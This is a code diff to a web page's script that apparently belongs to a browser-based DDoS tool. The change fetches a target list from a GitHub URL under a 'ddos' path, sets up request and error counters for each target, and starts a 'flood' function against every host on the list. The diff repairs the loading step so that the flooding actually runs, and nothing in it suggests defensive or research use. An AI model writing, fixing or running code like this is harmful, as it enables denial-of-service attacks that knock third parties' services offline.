@@ -46,15 +46,8 @@
 
     <script>
         let targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/targets.txt';
-        let reader = new FileReaderSync();
-        let result = reader.readAsText(targetsURL); 
-        console.log(result); 
 
-        var targets = result.split('\n')
         var targetStats = {}
-        targets.forEach((target) => {
-            targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
-        })
 
         var statsEl = document.getElementById('stats');
         function printStats() {
@@ -109,7 +102,15 @@
             }
         }
 
-        // Start
-        targets.map(flood)
+        fetch(targetsURL).then((r) => {
+            r.text().then((d) => {
+                let targets = d.split('\n');
+                console.log(targets);
+                targets.forEach((target) => {
+                    targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+                })
+                targets.map(flood)
+            })
+        })
     </script>
 </body>
